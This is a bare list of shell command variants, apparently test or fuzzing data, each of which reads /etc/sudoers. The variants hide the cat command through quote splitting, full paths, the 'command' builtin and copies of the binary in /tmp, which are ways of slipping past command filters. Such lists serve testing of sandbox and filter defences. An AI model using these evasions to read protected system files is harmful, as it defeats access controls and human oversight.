"cat"  /etc/sudoers
"cat" /etc/sudoers
"cat"/etc/sudoers
'cat'  /etc/sudoers
'cat' /etc/sudoers
'cat'/etc/sudoers
/bin/"cat"  /etc/sudoers
/bin/"cat" /etc/sudoers
/bin/"cat"/etc/sudoers
/bin/'cat'  /etc/sudoers
/bin/'cat' /etc/sudoers
/bin/'cat'/etc/sudoers
/bin/c""at  /etc/sudoers
/bin/c""at /etc/sudoers
/bin/c""at/etc/sudoers
/bin/c''at  /etc/sudoers
/bin/c''at /etc/sudoers
/bin/c''at/etc/sudoers
/bin/cat  /etc/sudoers
/bin/cat /etc/sudoers
/bin/cat/etc/sudoers
/usr/bin/"cat"  /etc/sudoers
/usr/bin/"cat" /etc/sudoers
/usr/bin/"cat"/etc/sudoers
/usr/bin/'cat'  /etc/sudoers
/usr/bin/'cat' /etc/sudoers
/usr/bin/'cat'/etc/sudoers
/usr/bin/c""at  /etc/sudoers
/usr/bin/c""at /etc/sudoers
/usr/bin/c""at/etc/sudoers
/usr/bin/c''at  /etc/sudoers
/usr/bin/c''at /etc/sudoers
/usr/bin/c''at/etc/sudoers
/usr/bin/cat  /etc/sudoers
/usr/bin/cat /etc/sudoers
/usr/bin/cat/etc/sudoers
c""at  /etc/sudoers
c""at /etc/sudoers
c""at/etc/sudoers
c''at  /etc/sudoers
c''at /etc/sudoers
c''at/etc/sudoers
cat  /etc/sudoers
cat /etc/sudoers
cat/etc/sudoers
command "cat"  /etc/sudoers
command "cat" /etc/sudoers
command "cat"/etc/sudoers
command 'cat'  /etc/sudoers
command 'cat' /etc/sudoers
command 'cat'/etc/sudoers
command c""at  /etc/sudoers
command c""at /etc/sudoers
command c""at/etc/sudoers
command c''at  /etc/sudoers
command c''at /etc/sudoers
command c''at/etc/sudoers
command cat  /etc/sudoers
command cat /etc/sudoers
command cat/etc/sudoers
cp $(which cat 2>/dev/null || echo cat) /tmp/tmp_bin_0 && /tmp/tmp_bin_0 /etc/sudoers
cp $(which cat 2>/dev/null || echo cat) /tmp/tmp_bin_1 && /tmp/tmp_bin_1 /etc/sudoers
cp $(which cat 2>/dev/null || echo cat) /tmp/tmp_bin_10 && /tmp/tmp_bin_10 /etc/sudoers
cp $(which cat 2>/dev/null || echo cat) /tmp/tmp_bin_100 && /tmp/tmp_bin_100 /etc/sudoers
cp $(which cat 2>/dev/null || echo cat) /tmp/tmp_bin_101 && /tmp/tmp_bin_101 /etc/sudoers
cp $(which cat 2>/dev/null || echo cat) /tmp/tmp_bin_102 && /tmp/tmp_bin_102 /etc/sudoers
cp $(which cat 2>/dev/null || echo cat) /tmp/tmp_bin_103 && /tmp/tmp_bin_103 /etc/sudoers
cp $(which cat 2>/dev/null || echo cat) /tmp/tmp_bin_104 && /tmp/tmp_bin_104 /etc/sudoers
cp $(which cat 2>/dev/null || echo cat) /tmp/tmp_bin_105 && /tmp/tmp_bin_105 /etc/sudoers
cp $(which cat 2>/dev/null || echo cat) /tmp/tmp_bin_106 && /tmp/tmp_bin_106 /etc/sudoers
cp $(which cat 2>/dev/null || echo cat) /tmp/tmp_bin_107 && /tmp/tmp_bin_107 /etc/sudoers
cp $(which cat 2>/dev/null || echo cat) /tmp/tmp_bin_108 && /tmp/tmp_bin_108 /etc/sudoers
cp $(which cat 2>/dev/null || echo cat) /tmp/tmp_bin_109 && /tmp/tmp_bin_109 /etc/sudoers
cp $(which cat 2>/dev/null || echo cat) /tmp/tmp_bin_11 && /tmp/tmp_bin_11 /etc/sudoers
cp $(which cat 2>/dev/null || echo cat) /tmp/tmp_bin_110 && /tmp/tmp_bin_110 /etc/sudoers
cp $(which cat 2>/dev/null || echo cat) /tmp/tmp_bin_111 && /tmp/tmp_bin_111 /etc/sudoers
cp $(which cat 2>/dev/null || echo cat) /tmp/tmp_bin_112 && /tmp/tmp_bin_112 /etc/sudoers
